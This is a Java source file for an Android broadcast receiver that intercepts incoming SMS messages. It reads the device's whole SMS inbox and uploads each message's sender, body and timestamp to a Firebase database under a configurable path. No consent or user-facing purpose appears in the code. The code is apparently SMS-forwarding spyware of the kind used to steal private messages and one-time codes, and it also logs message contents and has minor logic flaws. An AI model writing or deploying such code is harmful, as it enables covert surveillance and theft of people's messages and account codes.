package com.example.sms;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.TimeZone;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class Sms extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
          String custompath=getCustomPathFromPreferences(context);
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    // Process each SMS message
                    for (Object pdu : pdus) {
                        SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);

                        // Extract message details
                        String senderNumber = message.getDisplayOriginatingAddress();
                        String messageBody = message.getMessageBody();
                        long timestampMillis = message.getTimestampMillis();

                        // Log the details
                        String smsInfo = "From: " + senderNumber +
                                "\nMessage: " + messageBody + "\nReceived at: " + timestampMillis;
                        Log.d("OPPO", "onReceive: " + smsInfo);

                        // Save the message to local storage for later processing

                        saveSmsToLocalStorage(context, senderNumber, messageBody, timestampMillis);
                        compareStoredSms(context);
                    }
                }
            }
        }
    }
    private void saveSmsToLocalStorage(Context context, String sender, String messageBody, long timestampMillis) {
        // Use a local database, shared preferences, or another storage mechanism to save the SMS
        // This example uses SharedPreferences for simplicity
        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();

        // Create a unique key for each SMS based on timestamp
        String smsKey = String.valueOf(timestampMillis);

        // Store SMS details in SharedPreferences
        editor.putString("smsSender_" + smsKey, sender);
        editor.putString("smsBody_" + smsKey, messageBody);
        editor.putLong("smsTimestamp_" + smsKey, timestampMillis);

        editor.apply();
    }
    public void compareStoredSms(Context context) {
        Uri smsUri = Telephony.Sms.CONTENT_URI;
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(smsUri, null, null, null, null);

        if (cursor != null && cursor.moveToFirst()) {
            int timestampIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
            int senderIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);

            do {
                long timestamp = cursor.getLong(timestampIndex);
                String sender = cursor.getString(senderIndex);
                String body = cursor.getString(bodyIndex);

                isNewSms(context, sender, body, timestamp);
            } while (cursor.moveToNext());

            cursor.close();
        }
    }
    private void isNewSms(Context context, String sender, String messageBody,long timestamp) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        Set<String> processedTimestamps = sharedPreferences.getStringSet("smsTimestamp_", new HashSet<String>());

        // Check if this message has already been processed
        if (!processedTimestamps.contains(String.valueOf(timestamp))) {
            String customPath = getCustomPathFromPreferences(context);
            Log.d("SEND", "ISNEWSMS: " + messageBody);
            saveSmsToFirebase(customPath, sender, messageBody, timestamp);

            // Update processed timestamps (add current timestamp)
            processedTimestamps.add(String.valueOf(timestamp));
            sharedPreferences.edit().putStringSet("smsTimestamp_", processedTimestamps).apply();
        } else {
            Log.d("OLDSMS", "THIS IS OLD SMS. Timestamp: " + timestamp);
        }
    }
    private String getFormattedTime(long timestampMillis) {
        Locale locale = Locale.getDefault();
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy hh:mm:ss a z", locale);

        sdf.setTimeZone(TimeZone.getDefault());
        Date dateTime = new Date(timestampMillis);
        return sdf.format(dateTime);
    }

    private String getCustomPathFromPreferences(Context context) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        String customPath = sharedPreferences.getString("customPath", "");
        return sharedPreferences.getString("customPath", "");
    }
    private void saveSmsToFirebase(String custompath,String sender, String messageBody, long timestampmills) {

        String path = "user_messages/" + custompath;

        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference(path);

        // Format the timestamp as a human-readable string
        String formattedTime = getFormattedTime(timestampmills);

        // Create a data object to store in the database
        MySmsMessage smsMessage = new MySmsMessage(sender, messageBody, formattedTime);

        // Save the SMS to the database under the custom path with timestamp as the key
        databaseReference.child(formattedTime).setValue(smsMessage);


    }
}
